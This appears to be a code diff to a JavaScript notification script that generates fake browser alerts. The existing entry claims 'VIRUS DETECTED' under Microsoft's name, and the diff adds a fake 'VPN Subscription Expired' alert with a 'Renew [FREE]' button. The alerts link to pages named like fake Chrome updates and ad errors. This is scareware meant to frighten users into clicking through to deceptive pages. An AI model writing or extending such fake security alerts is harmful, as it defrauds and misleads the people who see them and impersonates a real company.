@@ -19,7 +19,7 @@ function showRandomNotification() {
     {
       title: "Remove Threats Now!",
       body: "VIRUS DETECTED. REMOVE THREATS NOW WITH MICROSOFT ANTIVIRUS",
-      icon: "https://cdn.glitch.global/cbb58682-7814-4e21-a791-7965cc901a5b/Microsoft%20Antivirus.png",
+      icon: "http://tetapux.vercel.app/assets/shield.jpg",
       url: "../nnm-ae/1000/gb20-aderror.html",
       actions: [
         { action: "scan", title: "🛡️ Scan Now" }
@@ -87,6 +87,18 @@ function showRandomNotification() {
       ],
       actionUrls: {
         remove_virus: "../pages/update-chrome2.html"
+      }
+    },
+    {
+      title: "𝐕𝐏𝐍 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 𝐄𝐱𝐩𝐢𝐫𝐞𝐝",
+      body: "Your VPN subscription has expired. Renew now to protect your device.",
+      icon: "https://images-ext-1.discordapp.net/external/cesoL_Wg5AYfDo76IFXiqEwZaxb-b6ISsIJX2je1czI/https/charlestech.fr/wp-content/uploads/2021/01/vpn-tuto.jpg?format=webp&width=1810&height=884",
+      url: "../red/premium-colors/vpn-subscripti.html",
+      actions: [
+        { action: "remove_virus", title: "Renew VPN Subscription [FREE]" }
+      ],
+      actionUrls: {
+        remove_virus: "../red/premium-colors/vpn-subscripti.html"
       }
     }
   ];
